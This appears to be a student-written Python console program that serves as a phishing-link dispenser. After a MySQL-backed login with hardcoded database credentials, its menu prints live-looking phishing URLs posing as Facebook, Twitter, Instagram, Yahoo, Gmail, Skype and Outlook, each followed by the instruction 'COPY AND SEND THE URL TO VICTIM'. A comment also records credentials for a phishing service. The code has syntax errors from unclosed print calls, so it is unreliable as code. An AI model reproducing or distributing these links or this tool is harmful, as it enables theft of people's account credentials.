import mysql.connector as sqldata
import random
from datetime import date
from datetime import datetime
def intro():
    print("\t\t\t\t**********************")
    print("\t\t\t\t     LET's CRACK IT")
    print("\t\t\t\t**********************")

    print("\t\t\t\t DELIVERED IN FRONT OF YOU BY:")
    print("\t\t\t\t   'VAIBHAV DEEP SINGH'")
    print("\t\t\t\t    'PRATYUSH TRIPATHI'")
    print("\t\t\t\t     'ARPAN YADAV'")
    print("\t\t\t\t      'KISHAN TIWARI'")
    input("\t\t\t\t 'PRESS ENTER TO CONTINUE'")
data=sqldata.connect(host="localhost",user="root",passwd="14344",database="service_database")
#USERNAME -- phishing213
#PASSWORD --Phishing@123
#WEBSITE -- smikta.info        
a2=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','x','y','z']
cur = data.cursor()
s="INSERT INTO new_accoun VALUES(%s,%s,%s,%s)"
s2="INSERT INTO user_login_activity VALUES(%s,%s,%s,%s)"
s3="INSERT INTO user_data VALUES(%s,%s)"
password =['14344',]
username=['vaibhav',]
global f1
now=datetime.now()
current_time=now.strftime("#%H:%M:%S")
today=date.today()
ch=''
bh=''
dh=''
ah =''
num=0
intro()
if data.is_connected():
    print("SERVER IS ONLINE NOW")
else:
    print('SERVER IS NOT CURRENTLY AVAILABLE')
    print('TRY AGAIN')
input("'PRESS ENTER TO PROCEED'")
while ah!='no' or ah!= 'yes':
    print("Are You a New User(YES/NO)")
    ah=str(input(''))
    if ah =="yes" or ah=="Yes"or ah=="YES":
        print("SORRY BUT TO USE OUR SERVICE YOU HAVE TO CREATE A NEW ACCOUNT")
        input("'PRESS ENTER TO CREATE NEW ACCOUNT':")
        f1=str(input('Enter Your First Name:'))
        f2=str(input('Enter Your Last Name:'))
        f3=int(input('Enter Your Age:'))
        f4=input('Enter Your Email ID:')
        print("Create Your Password")
        f5=input("Enter Your New Password: ")
        f6=input("Confirm Your Password: ")
        if f5!=f6:
            print("Your Password didn't Match")
        d2=(f1,f5)
        cur.execute(s3,d2)
        d1=(f1,f2,f3,f4)
        cur.execute(s,d1)
        data.commit()
        username.append(f1)
        password.append(f6)
        b5=random.randint(111, 999)
        c2=str(f1)
        b6=str(b5)
        print("Your Username is",f1)
        print('Your Password is',f5)
        
        print("PLEASE LOGIN WITH YOUR USERNAME AND PASSWORD")
        continue
    elif ah =='no'or ah=='NO'or ah=='No':
        b1=random.randint(10,100)
        b2=random.choice(a2)
        b3=random.randint(0, 99)
        b4=random.choice(a2)
        c2=str(b1)
        c3=str(b3)
        usrname=input("Enter Your Username: ")
        psswrd=input("Enter Your Password: ")
        cptch=str(c2+b2+c3+b4)
        
        print("Your Captcha is :",cptch)
        captcha=input("Enter the Above Shown Captcha to verify that you are not a robot: ")
        if usrname in username and psswrd in password and captcha==cptch:
            print("You Are Ready to go to use PHISHING service:")
            print("LOGIN SUCCESFULLY AT ",current_time,"ON DATE #",today)
            while ch != 'C':
                print("\tA. PHISHING")
                print("\tB. WANNA SEE SOURCE CODE")
                print("ENTER YOUR CHOICE")
                ch=str(input(""))
                if ch=='A'or ch=='a':
                    print("PHISING:")
                    print("\t ENTER YOUR CHOICE:") 
                    print("\t. WANNA USE PHISHING")
                    print("\ta. YES")
                    ch=input()
                    if ch=='a'or ch=='A':
                        print("\tMAIN MENU")
                        print("\t1. FACEBOOK MAIN PAGE")
                        print("\t2. TWITEER")
                        print("\t3. INSTAGRAM")
                        print("\t4. YAHOO")
                        print("\t5. GMAIL")
                        print("\t6. FACEBOOK PLAIN PAGE")
                        print("\t7. FACEBOOK LIKE AND FOLLOWERS")
                        print("\t8. SKYPE")
                        print("\t9. OUTLOOK")
                        print("\t10. CONTACT US:)"
                        print("\tSelect Your Option (1-10) ")
                        ch = input()
                        if ch == '1':
                            print('http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=xx&orders=780317074&auth=ZDI1NmQwMmE4ZTVjNGVlMWFjYTllNw==')
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch =='2':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=xtw-enq&orders=780317074&auth=NWE4NTk4ZWY2MjllNGJhY2U1MmNhZA==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '3':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=ist&orders=780317074&auth=ZDI1NmQwMmE4ZTVjNGVlMWFjYTllNw==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '4':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=xyh-enq&orders=780317074&auth=ZDI1NmQwMmE4ZTVjNGVlMWFjYTllNw==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '5':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=xgm-enq&orders=780317074&auth=ZDI1NmQwMmE4ZTVjNGVlMWFjYTllNw==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '6':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=x1&orders=780317074&auth=ZDI1NmQwMmE4ZTVjNGVlMWFjYTllNw==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '7':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=x2&orders=780317074&auth=NWE4NTk4ZWY2MjllNGJhY2U1MmNhZA==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '8':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=xsk-enq&orders=780317074&auth=ZDI1NmQwMmE4ZTVjNGVlMWFjYTllNw==")
                            print('COPY AND SEND THE URL TO VICTIM')
                            print("LET'S CRACK IT!!")
                            break
                        elif ch == '9':
                            print("http://shine.com.global.prod.fastly.net/MWQ3OTdlN2IwNWI1ZjRiYzVlNGFkZg==/?type=xhtq&orders=780317074&auth=NWE4NTk4ZWY2MjllNGJhY2U1MmNhZA==")
                            print("COPY AND SEND THE URL TO VICTIM")
                            print("LET'S CRACK IT")
                            break
                        elif ch=='10':
                            print("CONTACT US ON:)"
                            print("1. INSTAGRAM")
                            print("2. FACEBOOK")
                            print("3. TWITTER")
                            oh=input("ANY SOCIAL MEDIA ACCOUNT")
                            if oh =='1':
                                print("FOLLOW US ON INSTAGRAM :)"
                                print('vaibhavdeepsingh347')
                            elif oh=='2':
                                print("FOLLOW US ON FACEBOOK")
                                print()
                            elif oh=='3':
                                print("FOLLOW US ON TWITTER")
                                print()
                            else:
                                print("ENTER A VALID VALUE:")
                            d2 =(usrname,ch,today,current_time)
                            cur.execute(s2,d2)
                            data.commit()
                            break
                        else :
                            print("Invalid choice")
                            ch = input("Enter your choice : ")
                    elif ch=='B':
                        g=open("C:\\Users\\Vaibhav\\Desktop\\sourcecode.txt")
                        fh=g.readlines
        else:
            print("PLEASE ENTER A VALID CREDENTIAL")
